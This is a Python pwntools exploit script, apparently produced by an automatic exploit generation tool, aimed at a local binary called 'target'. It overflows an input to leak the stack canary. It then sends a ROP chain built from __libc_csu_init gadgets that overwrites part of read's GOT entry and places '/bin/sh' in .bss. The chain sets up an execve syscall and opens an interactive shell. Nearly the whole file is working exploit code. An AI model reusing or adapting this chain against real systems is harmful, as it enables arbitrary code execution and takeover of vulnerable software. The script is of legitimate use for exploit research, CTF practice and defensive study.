#!/usr/bin/env python3
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf = ELF('target', checksec=False)
__libc_csu_init = 0x401210
__libc_csu_init_call_target = 0x402e38
__libc_csu_init_gadget1 = 0x401266
__libc_csu_init_gadget2 = 0x401250
canary = 0x0
elf_base = 0x0
leave_ret = 0x401204
pivot_dest = 0x404858
pop_rbp_ret = 0x40114d
ret = 0x40101a

def solve_stage1(canary, elf_base, iostates) -> bytes:
    os.system('./launch-crax.sh -c {} -e {} -s {}'.format(hex(canary), hex(elf_base), iostates))
    with open('stage1.bin', 'rb') as f:
        return f.read()

if __name__ == '__main__':
    proc = elf.process()

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 25)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    # leaking: canary
    proc.recv(25)
    canary = u64(b'\x00' + proc.recv(7))
    log.info('leaked canary: {}'.format(hex(canary)))

    # input state (offset = 1024)
    # rop chain
    payload  = solve_stage1(canary, elf_base, 'o,i25,o25,i1024')[25:]
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x0)
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(elf_base + elf.got['read'])
    payload += p64(0x1)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(elf_base + elf.bss())
    payload += p64(0x3b)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(elf_base + elf.bss())
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x40'
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    proc.send(payload)
    time.sleep(0.2)

    proc.interactive()
